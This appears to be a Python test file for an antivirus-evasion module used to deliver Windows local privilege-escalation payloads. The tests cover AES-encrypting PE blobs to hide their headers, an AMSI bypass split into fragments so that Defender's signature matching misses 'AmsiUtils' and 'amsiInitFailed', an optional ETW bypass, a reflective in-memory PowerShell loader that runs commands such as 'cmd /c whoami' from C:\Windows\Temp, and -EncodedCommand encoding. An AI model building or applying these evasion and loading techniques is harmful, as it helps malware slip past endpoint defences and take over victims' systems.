#!/usr/bin/env python3
"""Tests for the AV evasion layer used by Windows LPE delivery."""

import sys
import os
import base64
import pytest

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

from sap_lpe_av_evasion import (
    encrypt_blob,
    decrypt_blob,
    build_in_memory_loader_ps,
    encode_powershell,
    _amsi_bypass_ps,
)


class TestEncryptBlob:

    def test_encrypt_roundtrip(self):
        plaintext = b"This is a fake PE blob " * 1000
        enc = encrypt_blob(plaintext)
        assert len(enc["key"]) == 32
        # IV (16) + ciphertext (padded to 16-byte multiple)
        assert enc["size_out"] >= enc["size_in"] + 16
        recovered = decrypt_blob(enc["encrypted"], enc["key"])
        assert recovered == plaintext

    def test_encrypt_fresh_iv_per_call(self):
        plaintext = b"x" * 64
        enc1 = encrypt_blob(plaintext, key=b"K" * 32)
        enc2 = encrypt_blob(plaintext, key=b"K" * 32)
        # Same plaintext + same key but different IV → different ciphertext
        assert enc1["encrypted"] != enc2["encrypted"]
        # Both still decrypt to the same plaintext
        assert decrypt_blob(enc1["encrypted"], enc1["key"]) == plaintext
        assert decrypt_blob(enc2["encrypted"], enc2["key"]) == plaintext

    def test_encrypted_blob_high_entropy(self):
        """Encrypted blob should look random — no recognizable PE header."""
        plaintext = b"MZ\x90\x00" + b"\x00" * 1024  # fake DOS header
        enc = encrypt_blob(plaintext)
        # The first 16 bytes are the IV (random). Then ciphertext.
        # The MZ header in plaintext must not appear in ciphertext.
        ct = enc["encrypted"][16:]
        assert b"MZ\x90\x00" not in ct[:128]

    def test_key_b64_decodes_to_key(self):
        enc = encrypt_blob(b"hello")
        decoded = base64.b64decode(enc["key_b64"])
        assert decoded == enc["key"]

    def test_wrong_key_size_rejected(self):
        with pytest.raises(ValueError):
            encrypt_blob(b"hello", key=b"too short")


class TestAmsiBypass:

    def test_amsi_bypass_string_split(self):
        """Literal 'AmsiUtils' and 'amsiInitFailed' must NOT appear
        as one piece in the rendered script — Defender's pattern
        matcher catches those substrings."""
        ps = _amsi_bypass_ps()
        assert "AmsiUtils" not in ps
        assert "amsiInitFailed" not in ps
        # But the pieces are there if you concatenate
        assert "Am" in ps and "siUt" in ps
        assert "am" in ps and "siIn" in ps


class TestBuildLoader:

    def test_basic_loader_has_required_components(self):
        loader = build_in_memory_loader_ps(
            encrypted_path=r"C:\Windows\Temp\x.dat",
            key_b64="QUJDREVGR0g=",
            entry_args=["cmd /c whoami", "lsarpc"],
            result_path=r"C:\Windows\Temp\r.txt",
        )
        # Reads encrypted blob
        assert "ReadAllBytes" in loader
        assert r"C:\Windows\Temp\x.dat" in loader
        # AES decryption present
        assert "AesMan" in loader or "AesManaged" in loader.replace(
            "'+'", "")
        # Reflection load (broken up but reconstructable)
        ps = loader.replace("'+'", "")
        assert "Reflection.Assembly" in ps
        # Args passed through
        assert "cmd /c whoami" in loader
        assert "lsarpc" in loader
        # Result captured
        assert "WriteAllText" in loader
        assert r"C:\Windows\Temp\r.txt" in loader

    def test_loader_escapes_apostrophes(self):
        loader = build_in_memory_loader_ps(
            encrypted_path=r"C:\path\with'quote.dat",
            key_b64="QUJD",
            entry_args=["arg with 'apos'"],
            result_path=r"C:\res.txt",
        )
        # PowerShell single-quote escape: '' (doubled)
        assert "with''quote" in loader
        assert "with ''apos''" in loader

    def test_loader_with_no_amsi_bypass(self):
        loader = build_in_memory_loader_ps(
            encrypted_path=r"C:\x.dat",
            key_b64="QQ==",
            entry_args=[],
            result_path=None,
            include_amsi_bypass=False,
            include_etw_bypass=False,
        )
        # Without bypass, no GetField('amsi...') call
        assert "siIn" not in loader  # part of amsiInitFailed
        # But the load+invoke is still there
        assert "Reflect" in loader

    def test_loader_no_result_path_skips_capture(self):
        loader = build_in_memory_loader_ps(
            encrypted_path=r"C:\x.dat",
            key_b64="QQ==",
            entry_args=["a"],
            result_path=None,
        )
        # No Console.SetOut nor WriteAllText when result_path is None
        assert "WriteAllText" not in loader
        assert "SetOut" not in loader


class TestEncodePowershell:

    def test_round_trip_via_powershell_format(self):
        ps = "Write-Host 'hello'"
        encoded = encode_powershell(ps)
        # PowerShell -EncodedCommand expects UTF-16-LE base64
        recovered = base64.b64decode(encoded).decode("utf-16-le")
        assert recovered == ps

    def test_encoded_is_ascii(self):
        ps = "Write-Host 'with — em-dash and 你好'"
        encoded = encode_powershell(ps)
        # Output must be plain ASCII (base64 alphabet)
        encoded.encode("ascii")
